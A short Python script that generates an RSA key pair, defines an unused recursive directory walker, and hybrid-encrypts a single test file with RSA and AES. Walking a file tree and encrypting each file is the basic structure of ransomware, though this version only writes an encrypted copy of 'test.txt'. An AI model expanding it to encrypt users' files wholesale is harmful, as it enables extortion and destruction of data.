import base64
import os

from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

key = RSA.generate(2048)
privateKey  = key.export_key()
publicKey   = key.publickey().export_key()

with open('private.pem', 'wb') as f:
    f.write(privateKey)

with open('public.pem', 'wb') as f:
    f.write(publicKey)

print('Private key saved to private.pem')
print('Public key saved to public.pem')
print('Done')



def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)

def encrypt(dataFile, publicKey):
    with open(dataFile, 'rb') as f:
        data = f.read()

        data = bytes(data)

        key = RSA.import_key(publicKey)
        sessionKey = os.urandom(16)

        cipher = PKCS1_OAEP.new(key)
        encryptedSessionKey = cipher.encrypt(sessionKey)

        cipher = AES.new(sessionKey, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        [fileName, fileExtension ] = dataFile.split('.')
        encryptedFile = fileName + '_encrypted.' + fileExtension
        with open(encryptedFile, 'wb') as f:
            [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
        print('Encrypted file saved to ' + encryptedFile)

fileName = 'test.txt'
encrypt(fileName, publicKey)